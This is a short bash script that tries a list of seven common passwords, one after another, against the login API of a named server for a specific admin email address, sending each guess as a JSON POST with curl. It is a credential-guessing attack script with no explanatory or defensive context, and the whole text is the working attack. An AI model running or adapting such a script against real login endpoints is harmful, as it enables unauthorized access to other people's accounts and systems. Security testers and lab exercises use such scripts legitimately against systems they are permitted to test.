# Try common passwords
for pass in admin password admin123 security Security123 web2000 Web2000!; do
  echo "Testing: security-admin@web2000-corp.com:$pass"
  curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"email\":\"security-admin@web2000-corp.com\",\"password\":\"$pass\"}" \
    "http://fileserver.rogue-sentinels.io:8080/api/v1/auth"
  echo ""
  sleep 0.5
done